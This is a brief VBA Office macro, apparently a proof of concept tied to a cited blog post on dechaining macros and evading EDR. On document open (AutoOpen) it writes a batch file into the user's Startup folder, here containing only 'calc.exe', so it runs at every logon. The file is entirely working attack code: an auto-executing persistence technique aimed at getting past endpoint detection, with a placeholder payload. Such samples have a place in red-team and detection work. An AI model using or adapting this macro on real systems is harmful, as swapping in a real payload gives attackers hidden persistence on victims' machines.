Sub AutoOpen()

' https://blog.f-secure.com/dechaining-macros-and-evading-edr/

Path = CreateObject("WScript.Shell").SpecialFolders("Startup")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(Path & "\test.bat", True)
' content for the batch file
objFile.Write "calc.exe" & vbCrLf
objFile.Close

End Sub

